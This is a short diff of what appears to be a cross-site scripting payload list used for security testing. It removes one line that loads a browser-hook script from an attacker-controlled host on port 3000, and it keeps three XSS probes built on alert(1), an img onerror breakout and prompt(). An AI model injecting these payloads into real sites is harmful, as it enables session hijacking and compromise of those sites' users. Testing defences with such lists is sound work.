@@ -1,4 +1,3 @@
-<script src=\"http://<IP>:3000/hook.js\"></script>
 <script>alert(1)</script>
 "’/><img src=’x’ onerror=’alert(1)’/>
 "-prompt(8)-"
